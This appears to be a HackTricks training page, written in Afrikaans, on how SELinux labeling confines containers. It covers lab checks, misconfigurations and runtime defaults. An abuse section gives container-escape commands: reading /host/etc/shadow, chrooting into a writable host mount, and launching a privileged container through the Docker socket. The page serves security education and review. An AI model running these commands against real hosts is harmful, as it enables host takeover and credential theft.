# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

SELinux is 'n **label-gebaseerde Mandatory Access Control**-stelsel. Elke relevante process en objek kan 'n security context dra, en die policy bepaal watter domains met watter types mag interaksie hê en op watter manier. In containerized environments beteken dit gewoonlik dat die runtime die container-process binne 'n beperkte container-domain launch en die container-inhoud met ooreenstemmende types label. As die policy behoorlik werk, kan die process moontlik die dinge lees en skryf waaraan sy label verwag word om toegang te hê, terwyl toegang tot ander host-inhoud geweier word, selfs al word daardie inhoud deur 'n mount sigbaar.

Dit is een van die kragtigste host-side protections wat in algemene Linux-container deployments beskikbaar is. Dit is veral belangrik op Fedora, RHEL, CentOS Stream, OpenShift en ander SELinux-sentriese ecosystems. In daardie environments sal 'n reviewer wat SELinux ignoreer, dikwels verkeerd verstaan waarom 'n oënskynlik voor-die-hand-liggende pad na host compromise eintlik geblokkeer word.

## AppArmor Vs SELinux

Die maklikste hoëvlakverskil is dat AppArmor path-based is, terwyl SELinux **label-based** is. Dit het groot gevolge vir container security. 'n Path-based policy kan anders optree as dieselfde host-inhoud onder 'n onverwagte mount path sigbaar word. 'n Label-based policy vra eerder wat die objek se label is en wat die process domain daarmee mag doen. Dit maak SELinux nie eenvoudig nie, maar dit maak dit wel bestand teen 'n klas van path-trick-aannames wat defenders soms per ongeluk in AppArmor-gebaseerde systems maak.

Omdat die model label-georiënteerd is, is container volume handling en relabeling-besluite security-critical. As die runtime of operator labels te wyd verander om "mounts te laat werk", kan die policy boundary wat veronderstel was om die workload te contain, baie swakker word as wat bedoel is.

## Lab

Om te sien of SELinux aktief is op die host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Om bestaande labels op die host te inspekteer:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Om 'n normale uitvoering te vergelyk met een waarin labeling gedeaktiveer is:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Op ’n SELinux-geaktiveerde host is dit ’n baie praktiese demonstrasie, omdat dit die verskil toon tussen ’n workload wat onder die verwagte container domain loop en een waarvan daardie enforcement layer verwyder is.

## Runtime Usage

Podman is besonder goed met SELinux geïntegreer op stelsels waar SELinux deel van die platform se verstekinstelling is. Rootless Podman plus SELinux is een van die sterkste algemene container-baselines, omdat die proses reeds aan die host-kant unprivileged is en steeds deur MAC policy beperk word. Docker kan ook SELinux gebruik waar dit ondersteun word, hoewel administrators dit soms deaktiveer om probleme met volume-labeling te omseil. CRI-O en OpenShift steun sterk op SELinux as deel van hul container-isolation-storie. Kubernetes kan SELinux-verwante settings ook blootstel, maar die waarde daarvan hang uiteraard daarvan af of die node OS SELinux werklik ondersteun en afdwing.

Die herhalende les is dat SELinux nie opsionele versiering is nie. In die ecosystems wat daaromheen gebou is, is dit deel van die verwagte security boundary.

## Misconfigurations

Die klassieke fout is `label=disable`. Operasioneel gebeur dit dikwels omdat ’n volume mount geweier is en die vinnigste korttermynoplossing was om SELinux uit die vergelyking te verwyder, eerder as om die labeling model reg te stel. Nog ’n algemene fout is verkeerde relabeling van host-inhoud. Breë relabel-operasies kan die toepassing laat werk, maar dit kan ook uitbrei waaraan die container toegang het tot ver buite wat oorspronklik bedoel is.

Dit is ook belangrik om nie **installed** SELinux met **effective** SELinux te verwar nie. ’n Host kan SELinux ondersteun en steeds in permissive mode wees, of die runtime kan die workload nie onder die verwagte domain begin nie. In daardie gevalle is die beskerming baie swakker as wat die dokumentasie moontlik aandui.

## Abuse

Wanneer SELinux afwesig, permissive of breedweg vir die workload gedeaktiveer is, word host-mounted paths baie makliker misbruik. Dieselfde bind mount wat andersins deur labels beperk sou word, kan ’n direkte weg na host-data of host-modification word. Dit is veral relevant wanneer dit gekombineer word met writable volume mounts, container runtime directories of operasionele kortpaaie wat sensitiewe host paths vir gerief blootgestel het.

SELinux verduidelik dikwels waarom ’n generiese breakout writeup onmiddellik op een host werk, maar herhaaldelik op ’n ander misluk, selfs al lyk die runtime flags dieselfde. Die ontbrekende bestanddeel is dikwels glad nie ’n namespace of ’n capability nie, maar ’n label boundary wat ongeskonde gebly het.

Die vinnigste praktiese kontrole is om die aktiewe context te vergelyk en dan mounted host paths of runtime directories te toets wat normaalweg deur labels beperk sou word:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Indien ’n host bind mount teenwoordig is en SELinux-labeling gedeaktiveer of verswak is, kom inligtingsopenbaarmaking dikwels eerste:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
As die mount skryfbaar is en die container vanuit die kernel se oogpunt effektief host-root is, is die volgende stap om ’n beheerde wysiging aan die host te toets eerder as om te raai:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Op gashere wat SELinux ondersteun, kan die verlies van labels rondom runtime-state-gidse ook direkte privilege-escalation-paaie blootlê:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Hierdie commands vervang nie ’n volledige escape chain nie, maar hulle maak baie vinnig duidelik of SELinux die rede was waarom toegang tot host-data of wysiging van lêers aan die host-kant verhoed is.

### Volledige voorbeeld: SELinux gedeaktiveer + skryfbare host-mount

As SELinux-labeling gedeaktiveer is en die host-lêerstelsel skryfbaar by `/host` gemount is, word ’n volledige host escape ’n normale bind-mount abuse case:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
As `chroot` suksesvol is, werk die container-proses nou vanaf die host-lêerstelsel:
```bash
id
hostname
cat /etc/passwd | tail
```
### Volledige voorbeeld: SELinux gedeaktiveer + Runtime-gids

As die workload 'n runtime socket kan bereik sodra labels gedeaktiveer is, kan die escape aan die runtime gedelegeer word:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Die relevante waarneming is dat SELinux dikwels die beheermeganisme was wat presies hierdie soort toegang tot host-paaie of runtime-state verhinder het.

## Kontroles

Die doel van die SELinux-kontroles is om te bevestig dat SELinux geaktiveer is, die huidige sekuriteitskonteks te identifiseer, en vas te stel of die lêers of paaie waarin jy belangstel, werklik deur labels beperk word.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Wat is hier interessant:

- `getenforce` behoort ideaal gesproke `Enforcing` terug te gee; `Permissive` of `Disabled` verander die betekenis van die hele SELinux-afdeling.
- As die huidige proses-konteks onverwags of te wyd lyk, loop die werklading moontlik nie onder die beoogde containerbeleid nie.
- As host-gemonteerde lêers of runtime-gidse etikette het waartoe die proses te vrylik toegang het, word bind mounts baie gevaarliker.

Wanneer jy ’n container op ’n SELinux-bekwame platform hersien, moenie etikettering as ’n sekondêre detail beskou nie. In baie gevalle is dit een van die hoofredes waarom die host nog nie reeds gekompromitteer is nie.

## Runtime-verstekwaardes

| Runtime / platform | Verstektoestand | Verstekgedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Docker Engine | Afhanklik van die host | SELinux-separasie is beskikbaar op SELinux-geaktiveerde hosts, maar die presiese gedrag hang van die host-/daemon-konfigurasie af | `--security-opt label=disable`, breë heretikettering van bind mounts, `--privileged` |
| Podman | Gewoonlik geaktiveer op SELinux-hosts | SELinux-separasie is ’n normale deel van Podman op SELinux-stelsels, tensy dit gedeaktiveer is | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Word oor die algemeen nie outomaties op Pod-vlak toegeken nie | SELinux-ondersteuning bestaan, maar Pods benodig gewoonlik `securityContext.seLinuxOptions` of platformspesifieke verstekwaardes; runtime- en node-ondersteuning word vereis | swak of breë `seLinuxOptions`, uitvoering op permissive/disabled-nodes, platformbeleide wat etikettering deaktiveer |
| CRI-O / OpenShift-styl-ontplooiings | Daar word gewoonlik sterk daarop gesteun | SELinux is dikwels ’n kernonderdeel van die node-isolasiemodel in hierdie omgewings | pasgemaakte beleide wat toegang te wyd maak, deaktivering van etikettering vir versoenbaarheid |

SELinux-verstekwaardes is meer verspreidingsafhanklik as seccomp-verstekwaardes. Op Fedora/RHEL/OpenShift-styl-stelsels is SELinux dikwels sentraal tot die isolasiemodel. Op nie-SELinux-stelsels is dit eenvoudig afwesig.
{{#include ../../../../banners/hacktricks-training.md}}
